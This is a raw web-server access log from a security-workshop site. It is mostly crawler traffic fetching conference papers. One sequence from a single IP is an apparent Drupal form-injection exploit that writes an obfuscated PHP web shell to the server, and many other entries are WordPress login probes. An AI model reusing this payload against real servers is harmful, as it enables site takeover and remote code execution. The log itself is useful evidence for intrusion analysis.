54.70.40.11 - - [26/Apr/2018:07:16:25 -0400] "GET /papers/2005/nspw2005-peisert.pdf HTTP/1.1" 200 3061661 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2018/ HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2016/ HTTP/1.1" 200 3518 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2015/ HTTP/1.1" 200 3473 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2011/ HTTP/1.1" 200 3470 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2009/ HTTP/1.1" 200 1932 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [26/Apr/2018:07:16:27 -0400] "GET /2014/ HTTP/1.1" 200 6478 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
66.249.73.87 - - [26/Apr/2018:07:16:35 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 200 5701 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:36 -0400] "GET /modules/user/user.css?nhfa6e HTTP/1.1" 200 1062 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:36 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 200 5370 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:37 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 200 599 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:37 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 200 472 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:38 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 200 1585 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:38 -0400] "GET /modules/comment/comment.css?nhfa6e HTTP/1.1" 200 505 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:39 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 200 1025 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:39 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 200 771 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:40 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.1" 200 746 "http://www.nspw.org/2013/dates" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:16:54 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 200 1019662 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.62.86.146 - - [26/Apr/2018:07:17:29 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20%22%5C%3C?php%20%5C$rtpz=%5C%22lKHByZWdfcmVwbGFjZShhcnJheShdgnL1teXHchd9XhdHhdNdLycsJy9ccy8nKShdwgYhdXJhdyYXkoJychdsJyhdsn%5C%22;%20%5C$tsdg%20=%20str_replace(%5C%22b%5C%22,%5C%22%5C%22,%5C%22bsbtbrb_rbebpblacbe%5C%22);%20%5C$wxhw=%5C%22KhdSwgam9pbhdihhcnJhehdV9zbhdGljZSgkYSwkYygkYSktMykpKSkpO2VjaG8ghdJzhdwvJy4kahdy4nPic7fQ==%5C%22;%20%5C$feka=%5C%22hdpeyRrPSdyaXNoZXJlJhdztlhdY2hhdvICc8hdJy4kayhd4nPic7ZXhdZhbChdhiYXhdNlNjRfZGVjb2R%5C%22;%20%5C$asys=%5C%22JGM9J2NvdWhd50JzskYT0khdX0NPT0tJRTtphdZihdhyZXNhdldhdChdgkhdYSkhd9PShddtcicgJiYhdgJGMohdJGEpPjM%5C%22;%20%5C$zjzy%20=%20%5C$tsdg(%5C%22q%5C%22,%20%5C%22%5C%22,%20%5C%22qbaqsqeq6q4q_qdqecoqde%5C%22);%20%5C$liiy%20=%20%5C$tsdg(%5C%22z%5C%22,%5C%22%5C%22,%5C%22crzezatez_fzunctzizon%5C%22);%20%5C$iuwt%20=%20%5C$liiy(%5C%22%5C%22,%20%5C$zjzy(%5C$tsdg(%5C%22hd%5C%22,%20%5C%22%5C%22,%20%5C$asys.%5C$feka.%5C$rtpz.%5C$wxhw)));%20%5C$iuwt();%20?%3E%22%20%3E%20ND9JQ5TS.php HTTP/1.1" 200 6641 "-" "python-requests/2.18.4"
185.62.86.146 - - [26/Apr/2018:07:17:32 -0400] "GET /file/ajax/name/%23value/form-P3nFxScrHbSKKZZe7nB5faOR27_f32GhNoAClPwH03c HTTP/1.1" 200 4338 "-" "python-requests/2.18.4"
185.62.86.146 - - [26/Apr/2018:07:17:37 -0400] "GET /ND9JQ5TS.php HTTP/1.1" 404 8014 "-" "python-requests/2.18.4"
66.249.73.87 - - [26/Apr/2018:07:17:45 -0400] "GET /2010 HTTP/1.1" 200 6945 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:18:37 -0400] "GET /2017/location HTTP/1.1" 200 6142 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.188.170 - - [26/Apr/2018:07:18:46 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 200 142975 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
66.249.73.91 - - [26/Apr/2018:07:19:29 -0400] "GET /papers/2008/nspw2008-greenwald.pdf HTTP/1.1" 200 347234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.36.157.41 - - [26/Apr/2018:07:19:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.36.157.41 - - [26/Apr/2018:07:19:51 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [26/Apr/2018:07:20:21 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 200 120240 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:07:20:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
125.209.235.175 - - [26/Apr/2018:07:21:13 -0400] "GET /2006 HTTP/1.1" 301 3944 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.87 - - [26/Apr/2018:07:21:13 -0400] "GET /papers/2006/nspw2006-porras.pdf HTTP/1.1" 200 157580 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.19 - - [26/Apr/2018:07:21:51 -0400] "GET /2003 HTTP/1.1" 301 3971 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.8 - - [26/Apr/2018:07:21:52 -0400] "GET /2003/ HTTP/1.1" 200 7851 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [26/Apr/2018:07:22:05 -0400] "GET /papers/2003/nspw2003-mchugh.pdf HTTP/1.1" 200 765834 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:22:27 -0400] "GET /papers/2009/nspw2009-peisert.pdf HTTP/1.1" 200 1015621 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:22:56 -0400] "GET /2015/organizers HTTP/1.1" 200 7087 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:23:48 -0400] "GET /papers/2011/nspw2011-locasto.pdf HTTP/1.1" 200 555120 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:24:40 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 200 129987 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:25:32 -0400] "GET /papers/2005/nspw2005-thorpe.pdf HTTP/1.1" 200 3949092 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:07:25:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [26/Apr/2018:07:26:24 -0400] "GET /papers/1999/nspw1999-jonsson.pdf HTTP/1.1" 200 774419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:27:15 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 200 103440 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:28:07 -0400] "GET /2005/cfp/latex/talk.ps HTTP/1.1" 200 212786 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:28:59 -0400] "GET /papers/2000/nspw2000-templeton.pdf HTTP/1.1" 200 709129 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
90.191.205.21 - - [26/Apr/2018:07:28:54 -0400] "GET /papers/2013/nspw2013-crane.pdf HTTP/1.1" 200 1891450 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
66.249.73.91 - - [26/Apr/2018:07:29:50 -0400] "GET /2009/proceedings/2013/nspw2013-egelman.pdf HTTP/1.1" 200 444745 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
88.148.53.4 - - [26/Apr/2018:07:29:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.148.53.4 - - [26/Apr/2018:07:29:53 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
209.126.90.22 - - [26/Apr/2018:07:30:16 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
209.126.90.22 - - [26/Apr/2018:07:30:16 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [26/Apr/2018:07:30:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:07:31:34 -0400] "GET /2017 HTTP/1.1" 200 7050 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:32:26 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769400 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
117.199.241.155 - - [26/Apr/2018:07:32:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
117.199.241.155 - - [26/Apr/2018:07:32:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [26/Apr/2018:07:33:18 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 200 179834 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:34:10 -0400] "GET /papers/1996/nspw1996-zurko.pdf HTTP/1.1" 200 887095 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:35:02 -0400] "GET /papers/2005/nspw2005-flechais.pdf HTTP/1.1" 200 2796418 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
152.250.153.16 - - [26/Apr/2018:07:35:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
152.250.153.16 - - [26/Apr/2018:07:35:04 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [26/Apr/2018:07:35:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [26/Apr/2018:07:35:53 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149498 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:36:45 -0400] "GET /2018 HTTP/1.1" 200 6903 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:36:54 -0400] "GET /2008/oc.content HTTP/1.1" 200 7958 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.221 - - [26/Apr/2018:07:37:02 -0400] "GET /2009/proceedings/2003/nspw2003-alkassar.pdf HTTP/1.1" 200 788430 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [26/Apr/2018:07:37:37 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:38:29 -0400] "GET /2005/cfp/latex/macros.sty HTTP/1.1" 200 14425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:39:21 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283643 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:40:12 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 200 682818 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:07:40:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:07:41:04 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 200 398465 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.209.235.183 - - [26/Apr/2018:07:41:16 -0400] "GET /2017 HTTP/1.1" 200 7090 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.89 - - [26/Apr/2018:07:41:56 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 200 458528 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:42:47 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:43:40 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740643 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.221 - - [26/Apr/2018:07:44:06 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 200 180309 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [26/Apr/2018:07:44:31 -0400] "GET /papers/1998/nspw1998-beaver.pdf HTTP/1.1" 200 1131138 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:07:45:23 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700592 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.123 - - [26/Apr/2018:07:45:20 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769875 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [26/Apr/2018:07:45:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [26/Apr/2018:07:46:15 -0400] "GET /2014 HTTP/1.1" 200 6697 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
201.6.228.249 - - [26/Apr/2018:07:46:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.6.228.249 - - [26/Apr/2018:07:46:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [26/Apr/2018:07:47:12 -0400] "GET /papers/2010/nspw2010-coles.pdf HTTP/1.1" 200 473164 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
58.84.15.237 - - [26/Apr/2018:07:47:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
58.84.15.237 - - [26/Apr/2018:07:47:49 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [26/Apr/2018:07:47:58 -0400] "GET /papers/2012/docs/p1.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:48:50 -0400] "GET /papers/2002/nspw2002-inoue.pdf HTTP/1.1" 200 872500 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
105.108.238.45 - - [26/Apr/2018:07:49:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.108.238.45 - - [26/Apr/2018:07:49:05 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [26/Apr/2018:07:49:42 -0400] "GET /papers/2012/docs/p43.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:49:55 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 200 464271 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:07:50:34 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 200 609033 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:07:50:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:07:51:26 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502565 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:52:18 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 740529 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:07:53:09 -0400] "GET /papers/1993/nspw1993-thomas.pdf HTTP/1.1" 200 494350 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.221 - - [26/Apr/2018:07:53:31 -0400] "GET /papers/2013/nspw2013-sundaramurthy.pdf HTTP/1.1" 200 356163 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [26/Apr/2018:07:54:01 -0400] "GET /2009/submission.shtml HTTP/1.1" 200 5246 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [26/Apr/2018:07:54:48 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.200 - - [26/Apr/2018:07:54:48 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.89 - - [26/Apr/2018:07:54:53 -0400] "GET /papers/1998/ HTTP/1.1" 200 4327 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.34 - - [26/Apr/2018:07:55:11 -0400] "GET /papers/1993/?C=N;O=D HTTP/1.1" 200 10559 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [26/Apr/2018:07:55:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [26/Apr/2018:07:55:45 -0400] "GET /2008/local.content.2008 HTTP/1.1" 200 6103 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.179.232.10 - - [26/Apr/2018:07:57:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [26/Apr/2018:07:57:28 -0400] "GET /papers/1997/nspw1997-mambo.pdf HTTP/1.1" 200 1056899 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.179.232.10 - - [26/Apr/2018:07:57:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
195.132.241.46 - - [26/Apr/2018:07:58:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
195.132.241.46 - - [26/Apr/2018:07:58:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.131 - - [26/Apr/2018:07:59:54 -0400] "GET /papers/1998/nspw1998-abrams.pdf HTTP/1.1" 200 735473 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [26/Apr/2018:08:00:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:08:00:56 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 200 129987 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:01:47 -0400] "GET /2010/2010/sponsors HTTP/1.1" 404 8020 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
112.203.227.105 - - [26/Apr/2018:08:01:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.203.227.105 - - [26/Apr/2018:08:01:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [26/Apr/2018:08:02:05 -0400] "GET /papers/2007/nspw2007-kursawe.pdf HTTP/1.1" 200 192252 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:02:39 -0400] "GET /2003/oc.shtml.bak HTTP/1.1" 200 9060 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:03:31 -0400] "GET /2002/papers.shtml HTTP/1.1" 200 5637 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
